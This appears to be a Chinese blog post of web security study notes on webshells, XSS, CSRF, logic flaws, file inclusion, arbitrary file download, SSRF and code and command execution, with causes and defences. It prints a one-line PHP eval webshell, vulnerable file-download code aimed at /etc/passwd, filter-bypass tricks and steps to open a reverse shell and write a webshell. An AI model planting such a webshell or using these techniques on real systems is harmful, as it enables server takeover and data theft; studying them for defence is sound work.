<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'v'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>​                    eval函数 将传入的内容作为php脚本执行</p>
<p>​                     $_POST[‘v’]传入想要执行的代码</p>
<p>​                     V是传递数据的参数，只有使用正确的参数名提交代码才能够执行，因此也称为一句话木马的密码</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212000208851.png"></p>
<p>一句话木马利用的思路：手动构造数据包利用</p>
<p>​                                        自动化工具使用</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212001333495.png"></p>
<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><h3 id="1-XSS原理"><a href="#1-XSS原理" class="headerlink" title="1.XSS原理"></a>1.XSS原理</h3><p>​        跨站脚本攻击，恶意攻击者往web页面插入恶意的js代码，当用户浏览器浏览该页面的时候，嵌入到里面的web的js会被执行，从而达到恶意攻击用户，xss是一种发生在前端的漏洞，所以受害对象主要是前端用户， XSS漏洞的主要原因是程序对输入和输出的控制不够严格，导致“精心构造”的脚本输入后， 在输到前端时被浏览器当作有效代码解析执行从而产生危害。</p>
<h3 id="2-XSS危害，攻击手段以及攻击流程"><a href="#2-XSS危害，攻击手段以及攻击流程" class="headerlink" title="2.XSS危害，攻击手段以及攻击流程"></a>2.XSS危害，攻击手段以及攻击流程</h3><p>危害： 对于那些半年没有更新的小企业网站来说，发生XSS漏洞几乎没有什么用。但 是在各类的社交平台，邮件系统，开源流行的Web应用，BBS,微博等 场景中， 造成的杀伤力却十分强大。</p>
<p>•攻击手段：XSS漏洞可以用来进行钓鱼攻击、获取键盘记录、用户cookie获取等。甚至 可以结合浏览器自身的漏洞对用户主机进行远程控制等</p>
<p>攻击流程：<img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212012913207.png"></p>
<h3 id="3-XSS注入思路"><a href="#3-XSS注入思路" class="headerlink" title="3.XSS注入思路"></a>3.XSS注入思路</h3><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212014846213.png"></p>
<h3 id="4-XSS防范"><a href="#4-XSS防范" class="headerlink" title="4.XSS防范"></a>4.XSS防范</h3><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212014945711.png"></p>
<h3 id="5-绕过"><a href="#5-绕过" class="headerlink" title="5.绕过"></a>5.绕过</h3><ol>
<li>大小写，双写绕过</li>
<li>编码绕过：URL编码，html实体编码，js编码，base编码</li>
</ol>
<h3 id="6-XSS分类："><a href="#6-XSS分类：" class="headerlink" title="6.XSS分类："></a>6.XSS分类：</h3><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212013002933.png"></p>
<p>反射型：：xss代码出现出现在url参数或者请求中，浏览器发出请求的时候，参数值作为输入提交到服务器，服务器接受处理后参数值出现在响应的html中，最后浏览器解析执行了这段xss代码</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212013413662.png"></p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212013700152.png"></p>
<p>存储型xss：xss下攻击者可以将脚本注入后台存储起来，构成持久性的危害</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212013848446.png"></p>
<p>DOM型:</p>
<p>dom:通过 JavaScript，可以重构整个 HTML 文档。您 可以添加、移除、改变或重排页面上的项目。 要改变页面的某个东西，JavaScript 就需要获得 对HTML 文档中所有元素进行访问的入口。这个 入口，连同对 HTML 元素进行添加、移动、改变 或移除的方法和属性，都是通过文档对象模型来 获得的（DOM）。 所以，你可以把DOM理解为一个一个访问HTML 的标准编程接口</p>
<p>DOM应用–对标签进行操作,用构造javascript恶意语句就可以修改 HTML的DOM结构中的某个值，从而触发跨站脚本攻击</p>
<p>DOM XSS与反射型XSS和存储型XSS的差别是在于DOM XSS的代码不 需要服务器解析响应的直接参与，触发XSS靠的是浏览器DOM解析器 的解析，可以完全认为是客户端的事情。</p>
<p>简单的DOM型的XSS—直接获取输入内容</p>
<p>另外一种DOM型XSS—通过URL获取输入内容</p>
<h3 id="7-反射型xss-get和post"><a href="#7-反射型xss-get和post" class="headerlink" title="7.反射型xss get和post"></a>7.反射型xss get和post</h3><p>get： <img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212014527149.png"></p>
<p>post： <img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212014606079.png"></p>
<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><h3 id="1-原理"><a href="#1-原理" class="headerlink" title="1.原理"></a>1.原理</h3><p>csrf是一种挟制用户在当前已登录的web应用程序上执行非本意的操作的攻击方法，在csrf的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接）然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了</p>
<p>简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的，攻击者盗用了你在网站的身份，以你的名义发送恶意请求，比如：以你的名义发邮件，发消息，修改个人信息，修改密码，财产操作或者是购买一些商品</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212082037225.png"></p>
<h3 id="2-csrf和xss的区别"><a href="#2-csrf和xss的区别" class="headerlink" title="2.csrf和xss的区别"></a>2.csrf和xss的区别</h3><p>CSRF是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而XSS 是直接盗取到了用户的权限，然后实施破坏</p>
<h3 id="3-csrf前提"><a href="#3-csrf前提" class="headerlink" title="3.csrf前提"></a>3.csrf前提</h3><p>• CSRF利用的前提条件 • 从图中可以看到，要完成一次CSRF攻击，受害者必须一次完成两个步骤: • 1.登录信任网站A,并在本地生成Cookieo。 • 2.在不退出的情况下，访问危险网站B。 • 如果不满足以上两个条件中的一个，就不会受到CSRF的攻击</p>
<h3 id="4-漏洞测试流程"><a href="#4-漏洞测试流程" class="headerlink" title="4.漏洞测试流程"></a>4.漏洞测试流程</h3><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212082600787.png"></p>
<h3 id="5-防范措施"><a href="#5-防范措施" class="headerlink" title="5.防范措施"></a>5.防范措施</h3><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212083654491.png"></p>
<p>​    token防范的原因：由于csrf他的主要原因是敏感操作的链接容易被伪造，token验证主要就是防止这个链接被伪造，每次请求的时候，都会增加一个随机码，后台每次对这个随机码进行验证</p>
<h2 id="常见的业务逻辑漏洞"><a href="#常见的业务逻辑漏洞" class="headerlink" title="常见的业务逻辑漏洞"></a>常见的业务逻辑漏洞</h2><h3 id="1-有哪些常见的业务逻辑漏洞"><a href="#1-有哪些常见的业务逻辑漏洞" class="headerlink" title="1.有哪些常见的业务逻辑漏洞"></a>1.有哪些常见的业务逻辑漏洞</h3><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212084435072.png"></p>
<h4 id="1-弱口令漏洞"><a href="#1-弱口令漏洞" class="headerlink" title="1.弱口令漏洞"></a>1.弱口令漏洞</h4><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212084737555.png"></p>
<h4 id="2-暴力破解"><a href="#2-暴力破解" class="headerlink" title="2.暴力破解"></a>2.暴力破解</h4><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212084855016.png"></p>
<h4 id="3-客户端验证"><a href="#3-客户端验证" class="headerlink" title="3.客户端验证"></a>3.客户端验证</h4><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212085019255.png"></p>
<h4 id="4-任意密码充值"><a href="#4-任意密码充值" class="headerlink" title="4.任意密码充值"></a>4.任意密码充值</h4><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212085107255.png"></p>
<h4 id="5-越权访问："><a href="#5-越权访问：" class="headerlink" title="5.越权访问："></a>5.越权访问：</h4><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212085525567.png"></p>
<h4 id="6-交易漏洞"><a href="#6-交易漏洞" class="headerlink" title="6.交易漏洞"></a>6.交易漏洞</h4><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212085720775.png"></p>
<h4 id="7-短信炸弹"><a href="#7-短信炸弹" class="headerlink" title="7.短信炸弹"></a>7.短信炸弹</h4><p>许多网站目前都提供短信接口，其中最常见的就是下发短信验证，如果此类功能没有进行限制则容易被攻击者利用向指定的手机发送大量的短信，既浪费资源又影响手机用户</p>
<h3 id="2-常见业务逻辑漏洞基本挖掘思路"><a href="#2-常见业务逻辑漏洞基本挖掘思路" class="headerlink" title="2.常见业务逻辑漏洞基本挖掘思路"></a>2.常见业务逻辑漏洞基本挖掘思路</h3><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212090041336.png"></p>
<h4 id="1-暴力破解漏洞挖掘"><a href="#1-暴力破解漏洞挖掘" class="headerlink" title="1.暴力破解漏洞挖掘"></a>1.暴力破解漏洞挖掘</h4><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212090148430.png"></p>
<h4 id="2-绕过验证漏洞挖掘"><a href="#2-绕过验证漏洞挖掘" class="headerlink" title="2.绕过验证漏洞挖掘"></a>2.绕过验证漏洞挖掘</h4><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212090227109.png"></p>
<h4 id="3-越权访问漏洞挖掘"><a href="#3-越权访问漏洞挖掘" class="headerlink" title="3.越权访问漏洞挖掘"></a>3.越权访问漏洞挖掘</h4><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212090339632.png"></p>
<h4 id="4-交易篡改漏洞挖掘"><a href="#4-交易篡改漏洞挖掘" class="headerlink" title="4.交易篡改漏洞挖掘"></a>4.交易篡改漏洞挖掘</h4><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212090419875.png"></p>
<h3 id="3-业务功能模块与业务逻辑漏洞"><a href="#3-业务功能模块与业务逻辑漏洞" class="headerlink" title="3.业务功能模块与业务逻辑漏洞"></a>3.业务功能模块与业务逻辑漏洞</h3><h4 id="1-账户管理类"><a href="#1-账户管理类" class="headerlink" title="1.账户管理类"></a>1.账户管理类</h4><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212090609268.png"></p>
<h4 id="2-电子商务类"><a href="#2-电子商务类" class="headerlink" title="2.电子商务类"></a>2.电子商务类</h4><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212090637876.png"></p>
<h4 id="3-业务服务类"><a href="#3-业务服务类" class="headerlink" title="3.业务服务类"></a>3.业务服务类</h4><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212090705021.png"></p>
<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="原理以及漏洞成因"><a href="#原理以及漏洞成因" class="headerlink" title="原理以及漏洞成因"></a>原理以及漏洞成因</h3><p>程序员开发人员一般会将重复的使用的函数写到单个文件中，需要使用的时候直接调用，这种文件调用的过程就是文件包含</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212091555671.png"></p>
<h3 id="常见的文件包含函数"><a href="#常见的文件包含函数" class="headerlink" title="常见的文件包含函数"></a>常见的文件包含函数</h3><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212091239695.png"></p>
<h3 id="文件包含分类"><a href="#文件包含分类" class="headerlink" title="文件包含分类"></a>文件包含分类</h3><h4 id="本地文件包含："><a href="#本地文件包含：" class="headerlink" title="本地文件包含："></a>本地文件包含：</h4><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212091724013.png"></p>
<h4 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h4><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212091737203.png"></p>
<h3 id="文件包含的利用-条件"><a href="#文件包含的利用-条件" class="headerlink" title="文件包含的利用   条件"></a>文件包含的利用   条件</h3><h5 id="利用文件包含需要满足两个基本条件："><a href="#利用文件包含需要满足两个基本条件：" class="headerlink" title="利用文件包含需要满足两个基本条件："></a>利用文件包含需要满足两个基本条件：</h5><p>1.include（）等函数通过动态变量的方式引入需要包含的文件</p>
<p>2.用户能够控制该动态变量</p>
<h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h5><h6 id="lfi利用"><a href="#lfi利用" class="headerlink" title="lfi利用"></a>lfi利用</h6><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212092126013.png"></p>
<h6 id="rfi利用"><a href="#rfi利用" class="headerlink" title="rfi利用"></a>rfi利用</h6><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212092210939.png"></p>
<h6 id="伪协议file"><a href="#伪协议file" class="headerlink" title="伪协议file://"></a>伪协议file://</h6><h6 id="伪协议data-和-php-input"><a href="#伪协议data-和-php-input" class="headerlink" title="伪协议data:// 和 php://input"></a>伪协议data:// 和 php://input</h6><h6 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h6><h3 id="本地文件漏洞挖掘"><a href="#本地文件漏洞挖掘" class="headerlink" title="本地文件漏洞挖掘"></a>本地文件漏洞挖掘</h3><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212092705762.png"></p>
<h3 id="本地文件包含预防"><a href="#本地文件包含预防" class="headerlink" title="本地文件包含预防"></a>本地文件包含预防</h3><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212092809815.png"></p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212092823356.png"></p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212092835733.png"></p>
<h2 id="任意文件查看与下载"><a href="#任意文件查看与下载" class="headerlink" title="任意文件查看与下载"></a>任意文件查看与下载</h2><h3 id="1-原理-amp-危害-amp-分类："><a href="#1-原理-amp-危害-amp-分类：" class="headerlink" title="1.原理&amp;危害&amp;分类："></a>1.原理&amp;危害&amp;分类：</h3><p>一些网站的业务需求，可能会提供文件查看或者下载的功能，如果对用户的查看或下载的文件不进行限制，就可以查看或者下载文件，可以是源代码，敏感文件等等各种敏感信息</p>
<pre class="line-numbers language-none"><code class="language-none">用户控制文件名输入
$filename=$_GET['filename'];
$filename没有经过校验，或者校验不合格，用户可以控制这个变量下载任意
的文件，比如/etc/passwd、./index.php等等。这样就造成了任意文件下载
漏洞。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>危害：下载服务器任意文件，包含脚本代码文件，系统敏感文件，可以配合其他类型的漏洞，进一步进行代码审计，查找更多可以利用的代码</p>
<p>分类：任意文件读取</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;?php
//读取test.txt文件
$filename="test.txt";
//第一种
readfile($filename);
//第二种
echo file_get_contents($filename);
//第三种
$fiiename="test.txt"；
$fp=fopen($filename,"r")or
die("Unable to open fiile!");
$data = fread($fp,1024);
fclose($fp);
echo $data;
?&gt;
$filename=$_GET[f]; 当读取的文件是以传参的形式输入那么用户就可控
$filename没有经过校验，或者校验不合格，用户可以控制这个变量读 取任
意的文件，比如/etc/passwd、./index.php等等。这洋就造成了任 意文件读取
漏洞<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​            任意文件下载</p>
<pre class="line-numbers language-none"><code class="language-none">两种文件下载方式:
直接下载:常见是直接在URL地址后面跟着文件压缩包
&lt;a href="http://www.a.com/ccc.rar"&gt;下载&lt;/a&gt;
这种方式无漏洞
附件下载:
&lt;?php if (empty($_GET['filename'])){
exit();}
$filename = $_GET['filename'];
//以二进制方式下载,保证内容不出错
header('Content-Type:application/octet-stream');
//获取文件大小
header("Accept-Length:".filesize($filename));
//以附件的方式下载 需要结合读文件才能下载readfile($filename);
header('Content-Disposition:attachment;filename='.$filename);
readfile($filename);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="2-漏洞成因"><a href="#2-漏洞成因" class="headerlink" title="2.漏洞成因"></a>2.漏洞成因</h3><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212093244135.png"></p>
<h3 id="3-漏洞挖掘"><a href="#3-漏洞挖掘" class="headerlink" title="3.漏洞挖掘"></a>3.漏洞挖掘</h3><p>1、Web漏洞扫描器(awvs, appscan, nessus) ； 2、手动挖掘从连接和参数名查看；</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212094415484.png"></p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212094443756.png"></p>
<h3 id="4-漏洞修复"><a href="#4-漏洞修复" class="headerlink" title="4.漏洞修复"></a>4.漏洞修复</h3><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212094510083.png"></p>
<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>服务器端请求伪造，SSRF是一种由攻击者构造形成的由服务端发起请求的一个安全漏洞，一般情况下，ssrf攻击的目标是从外网无法访问的内部系统（正是因为他是由于内部服务端发起的，所以他能够请求到与他相连而与外网隔离的内部系统）</p>
<p>SSRF是由于服务端获取其他服务器的相关信息的功能 中形成的</p>
<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>由于很多网站都提供了从其他的服务器上面获取数据的一些功能，使用用户指定的url，网站可以获取图片，下载地址，读取文件内容等等，如果没有对目标地址做过滤或者是一些限制，这个功能被恶意使用，就可以利用存在缺陷的web应用程序作为代理攻击远程和本地服务器</p>
<h3 id="SSRF危害"><a href="#SSRF危害" class="headerlink" title="SSRF危害"></a>SSRF危害</h3><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212101809218.png"></p>
<h3 id="SSRF漏洞挖掘"><a href="#SSRF漏洞挖掘" class="headerlink" title="SSRF漏洞挖掘"></a>SSRF漏洞挖掘</h3><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212102007617.png"></p>
<h3 id="通用的ssrf实例以及绕过"><a href="#通用的ssrf实例以及绕过" class="headerlink" title="通用的ssrf实例以及绕过"></a>通用的ssrf实例以及绕过</h3><pre class="line-numbers language-none"><code class="language-none">Weblogic(wbe中间件)配置不当，天生ssrf漏洞
Discuz x2.5/x3.0/x3.1/x3.2(论坛软件系统) ssrf漏洞<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h5 id="绕过："><a href="#绕过：" class="headerlink" title="绕过："></a>绕过：</h5><p>1.IP地址转换成十进制:<br>127.0.0.1=2130706433  ping 2130706433</p>
<p>2.<img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212102843393.png"></p>
<h3 id="ssrf防范"><a href="#ssrf防范" class="headerlink" title="ssrf防范"></a>ssrf防范</h3><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212102947529.png"></p>
<h2 id="任意代码执行漏洞"><a href="#任意代码执行漏洞" class="headerlink" title="任意代码执行漏洞"></a>任意代码执行漏洞</h2><h3 id="1-原理-1"><a href="#1-原理-1" class="headerlink" title="1.原理"></a>1.原理</h3><p>在web应用中有时候程序员为了灵活性，简洁性，会在代码中利用eval函数等等去处理，比如当应用在调用一些能将字符串转化成代码的函数时，没有考虑到用户能够控制整个字符串，将会造成代码执行漏洞</p>
<h3 id="2-危害-1"><a href="#2-危害-1" class="headerlink" title="2.危害"></a>2.危害</h3><pre class="line-numbers language-none"><code class="language-none">1.执行任意代码
2.向网站写Webshell
3.控制整个网站甚至是服务器<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h3 id="3-利用及其函数"><a href="#3-利用及其函数" class="headerlink" title="3.利用及其函数"></a>3.利用及其函数</h3><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212103637481.png"></p>
<h3 id="4-防御"><a href="#4-防御" class="headerlink" title="4.防御"></a>4.防御</h3><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212103958464.png"></p>
<h2 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h2><h3 id="1-原理-2"><a href="#1-原理-2" class="headerlink" title="1.原理"></a>1.原理</h3><p>一般出现这种漏洞，是因为系统从设计需要 给用户提供指定的远程命令操作的接口，比如常见的路由器，防火墙，入侵检测等设备的web管理界面上面，提交后，后台会对ip地址进行一次ping测试，并且返回测试结果，如果设计者在完成该功能时候，没有进行严格的安全控制，就会导致攻击者通过该接口提交一些意想不到的命令，从而让后台进行执行，控制整个后台服务器</p>
<h3 id="2-成因："><a href="#2-成因：" class="headerlink" title="2.成因："></a>2.成因：</h3><p>应用在调用这些函数执行命令的时候，如果将用户输入作为系统命令的参数拼接到命令行中，在没有过滤用户的输入情况下，就会造成命令执行漏洞</p>
<h3 id="3-危害"><a href="#3-危害" class="headerlink" title="3.危害"></a>3.危害</h3><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212110235621.png"></p>
<h3 id="4-命令执行漏洞利用"><a href="#4-命令执行漏洞利用" class="headerlink" title="4.命令执行漏洞利用"></a>4.命令执行漏洞利用</h3><h4 id="1-相关函数"><a href="#1-相关函数" class="headerlink" title="1.相关函数"></a>1.相关函数</h4><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212110445549.png"></p>
<h4 id="2-系统命令"><a href="#2-系统命令" class="headerlink" title="2.系统命令"></a>2.系统命令</h4><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212110611950.png"></p>
<h4 id="3-system（）函数利用"><a href="#3-system（）函数利用" class="headerlink" title="3.system（）函数利用"></a>3.system（）函数利用</h4><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212110835750.png"></p>
<h4 id="4-如果有写权限的话"><a href="#4-如果有写权限的话" class="headerlink" title="4.如果有写权限的话"></a>4.如果有写权限的话</h4><pre class="line-numbers language-none"><code class="language-none">1.反弹shell，尝试提权
2.linux系统执行pwd得到绝对路径，写一句话木马
3.windows系统下执行chdir得到绝对路径，写一句话木马<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>5.防范</p>
